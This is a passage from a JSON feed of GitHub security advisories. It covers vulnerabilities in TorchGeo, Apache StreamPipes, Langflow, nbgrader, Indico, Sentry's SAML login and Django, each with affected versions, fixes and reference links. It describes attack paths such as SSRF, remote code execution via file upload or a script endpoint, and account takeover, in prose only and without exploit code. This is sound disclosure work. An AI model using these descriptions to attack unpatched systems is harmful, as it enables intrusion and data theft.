            "date_published": "2025-01-21T20:25:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f8c8-4pm7-w885"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>TorchGeo Remote Code Execution Vulnerability</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-49048\">https://nvd.nist.gov/vuln/detail/CVE-2024-49048</a></li>\n<li><a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49048\">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49048</a></li>\n<li><a href=\"https://github.com/microsoft/torchgeo/pull/2323\">https://github.com/microsoft/torchgeo/pull/2323</a></li>\n<li><a href=\"https://github.com/microsoft/torchgeo/releases/tag/v0.6.1\">https://github.com/microsoft/torchgeo/releases/tag/v0.6.1</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/torchgeo/PYSEC-2024-204.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/torchgeo/PYSEC-2024-204.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g5vp-j278-8pjh\">https://github.com/advisories/GHSA-g5vp-j278-8pjh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g5vp-j278-8pjh",
            "title": "[torchgeo] TorchGeo Remote Code Execution Vulnerability",
            "date_modified": "2025-01-21T19:43:07.000Z",
            "date_published": "2024-11-12T18:30:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g5vp-j278-8pjh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Time-of-check Time-of-use (TOCTOU) Race Condition vulnerability in Apache StreamPipes in user self-registration.\nThis allows an attacker to potentially request the creation of multiple accounts with the same email address until the email address is registered, creating many identical users and corrupting StreamPipe's user management.\nThis issue affects Apache StreamPipes: through 0.93.0.</p>\n<p>Users are recommended to upgrade to version 0.95.0, which fixes the issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-30471\">https://nvd.nist.gov/vuln/detail/CVE-2024-30471</a></li>\n<li><a href=\"https://lists.apache.org/thread/8yodrmohgcybq900or3d4hc1msl230fr\">https://lists.apache.org/thread/8yodrmohgcybq900or3d4hc1msl230fr</a></li>\n<li><a href=\"https://github.com/apache/streampipes/releases/tag/release%2F0.95.0\">https://github.com/apache/streampipes/releases/tag/release%2F0.95.0</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/streampipes/PYSEC-2024-172.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/streampipes/PYSEC-2024-172.yaml</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2024/07/16/9\">http://www.openwall.com/lists/oss-security/2024/07/16/9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2qph-v9p2-q2gv\">https://github.com/advisories/GHSA-2qph-v9p2-q2gv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2qph-v9p2-q2gv",
            "title": "[streampipes] Apache StreamPipes potentially allows creation of multiple identical accounts",
            "date_modified": "2025-01-21T18:27:43.000Z",
            "date_published": "2024-07-17T09:30:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2qph-v9p2-q2gv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Server-Side Request Forgery (SSRF) vulnerability in Apache StreamPipes during installation process of pipeline elements.\nPreviously, StreamPipes allowed users to configure custom endpoints from which to install additional pipeline elements. \nThese endpoints were not properly validated, allowing an attacker to get StreamPipes to send an HTTP GET request to an arbitrary address.</p>\n<p>This issue affects Apache StreamPipes: through 0.93.0.</p>\n<p>Users are recommended to upgrade to version 0.95.0, which fixes the issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-31979\">https://nvd.nist.gov/vuln/detail/CVE-2024-31979</a></li>\n<li><a href=\"https://lists.apache.org/thread/8lryp3bxnby9kmk13odkz2jbfdjfvf0y\">https://lists.apache.org/thread/8lryp3bxnby9kmk13odkz2jbfdjfvf0y</a></li>\n<li><a href=\"https://github.com/apache/streampipes/commit/cd5a7b46e3383573f0f2b51da4b7306d4936aa3f\">https://github.com/apache/streampipes/commit/cd5a7b46e3383573f0f2b51da4b7306d4936aa3f</a></li>\n<li><a href=\"https://github.com/apache/streampipes/releases/tag/release%2F0.95.0\">https://github.com/apache/streampipes/releases/tag/release%2F0.95.0</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/streampipes/PYSEC-2024-174.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/streampipes/PYSEC-2024-174.yaml</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2024/07/16/11\">http://www.openwall.com/lists/oss-security/2024/07/16/11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9gr7-gh74-qg9x\">https://github.com/advisories/GHSA-9gr7-gh74-qg9x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9gr7-gh74-qg9x",
            "title": "[streampipes] Apache StreamPipes has possibility of SSRF in pipeline element installation process",
            "date_modified": "2025-01-21T18:27:30.000Z",
            "date_published": "2024-07-17T09:30:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9gr7-gh74-qg9x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Unrestricted Upload of File with dangerous type vulnerability in Apache StreamPipes.\nSuch a dangerous type might be an executable file that may lead to a remote code execution (RCE).\nThe unrestricted upload is only possible for authenticated and authorized users.</p>\n<p>This issue affects Apache StreamPipes: through 0.93.0.</p>\n<p>Users are recommended to upgrade to version 0.95.0, which fixes the issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-31411\">https://nvd.nist.gov/vuln/detail/CVE-2024-31411</a></li>\n<li><a href=\"https://lists.apache.org/thread/b0657okbwzg5xxs11hphvc9qrd9s70mt\">https://lists.apache.org/thread/b0657okbwzg5xxs11hphvc9qrd9s70mt</a></li>\n<li><a href=\"https://github.com/apache/streampipes/releases/tag/release%2F0.95.0\">https://github.com/apache/streampipes/releases/tag/release%2F0.95.0</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/streampipes/PYSEC-2024-173.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/streampipes/PYSEC-2024-173.yaml</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2024/07/16/10\">http://www.openwall.com/lists/oss-security/2024/07/16/10</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6523-jf4r-c962\">https://github.com/advisories/GHSA-6523-jf4r-c962</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6523-jf4r-c962",
            "title": "[streampipes] Apache StreamPipes has potential remote code execution (RCE) via file upload",
            "date_modified": "2025-01-21T18:27:23.000Z",
            "date_published": "2024-07-17T12:31:11.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6523-jf4r-c962"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Langflow allows remote code execution if untrusted users are able to reach the \"POST /api/v1/custom_component\" endpoint and provide a Python script.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37014\">https://nvd.nist.gov/vuln/detail/CVE-2024-37014</a></li>\n<li><a href=\"https://github.com/langflow-ai/langflow/issues/1973\">https://github.com/langflow-ai/langflow/issues/1973</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/langflow/PYSEC-2024-177.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/langflow/PYSEC-2024-177.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qg33-x2c5-6p44\">https://github.com/advisories/GHSA-qg33-x2c5-6p44</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qg33-x2c5-6p44",
            "title": "[langflow] Langflow remote code execution vulnerability",
            "date_modified": "2025-01-21T18:18:12.000Z",
            "date_published": "2024-06-10T21:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qg33-x2c5-6p44"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Enabling frame-ancestors: 'self' grants any JupyterHub user the ability to extract formgrader content by sending malicious links to users with access to formgrader, at least when using the default JupyterHub configuration of <code>enable_subdomains = False</code>.</p>\n<p>#1915 disables a protection which would allow user Alice to craft a page embedding formgrader in an IFrame. If Bob visits that page, his credentials will be sent and the formgrader page loaded. Because Alice's page is on the same Origin as the formgrader iframe, Javasript on Alice's page has <em>full access</em> to the contents of the page served by formgrader using Bob's credentials.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Disable <code>frame-ancestors: self</code>, or</li>\n<li>enable per-user and per-service subdomains with <code>JupyterHub.enable_subdomains = True</code> (then even if embedding in an IFrame is allowed, the host page does not have access to the contents of the frame).</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<p>JupyterHub documentation on why and when <code>frame-ancestors: self</code> is insecure, and why it was disabled by default: <a href=\"https://jupyterhub.readthedocs.io/en/stable/explanation/websecurity.html#:~:text=frame-ancestors\">https://jupyterhub.readthedocs.io/en/stable/explanation/websecurity.html#:~:text=frame-ancestors</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyter/nbgrader/security/advisories/GHSA-fcr8-4r9f-r66m\">https://github.com/jupyter/nbgrader/security/advisories/GHSA-fcr8-4r9f-r66m</a></li>\n<li><a href=\"https://github.com/jupyter/nbgrader/pull/1915\">https://github.com/jupyter/nbgrader/pull/1915</a></li>\n<li><a href=\"https://github.com/jupyter/nbgrader/commit/73e137511ac1dc02e95790d4fd6d4d88dab42325\">https://github.com/jupyter/nbgrader/commit/73e137511ac1dc02e95790d4fd6d4d88dab42325</a></li>\n<li><a href=\"https://jupyterhub.readthedocs.io/en/stable/explanation/websecurity.html\">https://jupyterhub.readthedocs.io/en/stable/explanation/websecurity.html</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23205\">https://nvd.nist.gov/vuln/detail/CVE-2025-23205</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fcr8-4r9f-r66m\">https://github.com/advisories/GHSA-fcr8-4r9f-r66m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fcr8-4r9f-r66m",
            "title": "[nbgrader] nbgrader's `frame-ancestors: self` grants all users access to formgrader",
            "date_modified": "2025-01-17T21:56:52.000Z",
            "date_published": "2025-01-17T16:29:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fcr8-4r9f-r66m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A Broken Object Level Authorization (BOLA) vulnerability in Indico v3.2.9 allows attackers to access sensitive information via sending a crafted POST request to the component /api/principals.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-50633\">https://nvd.nist.gov/vuln/detail/CVE-2024-50633</a></li>\n<li><a href=\"https://github.com/cetinpy/CVE-2024-50633\">https://github.com/cetinpy/CVE-2024-50633</a></li>\n<li><a href=\"https://github.com/cetinpy/CVE-2024-50633/issues/1\">https://github.com/cetinpy/CVE-2024-50633/issues/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3wg7-r7q5-r2jf\">https://github.com/advisories/GHSA-3wg7-r7q5-r2jf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3wg7-r7q5-r2jf",
            "title": "[indico] Indico Insecure Access",
            "date_modified": "2025-01-21T17:12:44.000Z",
            "date_published": "2025-01-16T18:31:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3wg7-r7q5-r2jf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A critical vulnerability was discovered in the SAML SSO implementation of Sentry. It was reported to us via our private bug bounty program.</p>\n<p>The vulnerability allows an attacker to take over any user account by using a malicious SAML Identity Provider and another organization on the same Sentry instance. The victim email address must be known in order to exploit this vulnerability.</p>\n<h3 id=\"patches\">Patches</h3>\n<ul>\n<li><a href=\"https://sentry.io\">Sentry SaaS</a>: The fix was deployed on Jan 14, 2025.</li>\n<li><a href=\"https://github.com/getsentry/self-hosted\">Self-Hosted Sentry</a>: If only a single organization is allowed (<code>SENTRY_SINGLE_ORGANIZATION = True</code>), then no action is needed. Otherwise, users should upgrade to version 25.1.0 or higher.</li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No known workarounds.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry/pull/83407\">https://github.com/getsentry/sentry/pull/83407</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry/security/advisories/GHSA-7pq6-v88g-wf3w\">https://github.com/getsentry/sentry/security/advisories/GHSA-7pq6-v88g-wf3w</a></li>\n<li><a href=\"https://github.com/getsentry/sentry/pull/83407\">https://github.com/getsentry/sentry/pull/83407</a></li>\n<li><a href=\"https://github.com/getsentry/sentry/commit/6db508f7949d117c7dff748a3c82c3a272bf7cfd\">https://github.com/getsentry/sentry/commit/6db508f7949d117c7dff748a3c82c3a272bf7cfd</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-22146\">https://nvd.nist.gov/vuln/detail/CVE-2025-22146</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7pq6-v88g-wf3w\">https://github.com/advisories/GHSA-7pq6-v88g-wf3w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7pq6-v88g-wf3w",
            "title": "[sentry] Sentry's improper authentication on SAML SSO process allows user impersonation",
            "date_modified": "2025-01-15T22:01:23.000Z",
            "date_published": "2025-01-15T21:25:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7pq6-v88g-wf3w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in Django 5.1 before 5.1.5, 5.0 before 5.0.11, and 4.2 before 4.2.18. Lack of upper-bound limit enforcement in strings passed when performing IPv6 validation could lead to a potential denial-of-service attack. The undocumented and private functions <code>clean_ipv6_address</code> and <code>is_valid_ipv6_address</code> are vulnerable, as is the <code>django.forms.GenericIPAddressField</code> form field. (The django.db.models.GenericIPAddressField model field is not affected.)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56374\">https://nvd.nist.gov/vuln/detail/CVE-2024-56374</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/dev/releases/security\">https://docs.djangoproject.com/en/dev/releases/security</a></li>\n<li><a href=\"https://groups.google.com/g/django-announce\">https://groups.google.com/g/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2025/jan/14/security-releases\">https://www.djangoproject.com/weblog/2025/jan/14/security-releases</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/01/14/2\">http://www.openwall.com/lists/oss-security/2025/01/14/2</a></li>\n<li><a href=\"https://github.com/django/django/commit/ca2be7724e1244a4cb723de40a070f873c6e94bf\">https://github.com/django/django/commit/ca2be7724e1244a4cb723de40a070f873c6e94bf</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2025-1.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2025-1.yaml</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2025/01/msg00024.html\">https://lists.debian.org/debian-lts-announce/2025/01/msg00024.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qcgg-j2x8-h9g8\">https://github.com/advisories/GHSA-qcgg-j2x8-h9g8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qcgg-j2x8-h9g8",
            "title": "[Django] Django has a potential denial-of-service vulnerability in IPv6 validation",
            "date_modified": "2025-01-23T18:32:22.000Z",
            "date_published": "2025-01-14T21:31:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qcgg-j2x8-h9g8"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}